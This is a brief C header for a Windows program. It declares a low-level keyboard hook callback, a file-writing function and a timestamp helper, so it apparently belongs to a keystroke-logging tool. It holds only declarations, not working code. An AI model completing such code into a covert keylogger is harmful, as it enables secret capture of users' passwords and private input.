#ifndef LOG_H
#define LOG_H

#define WIN32_LEAN_AND_MEAN // Remove winioctl.h if/elif errors

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <io.h>
#include <fileapi.h>

int		write_to_file(char *str);
char	*GetDateFormated(void);

	extern HANDLE	fd;

LRESULT CALLBACK LowLevelKeyboardProc(
  _In_ int    nCode,
  _In_ WPARAM wParam,
  _In_ LPARAM lParam
);

#endif
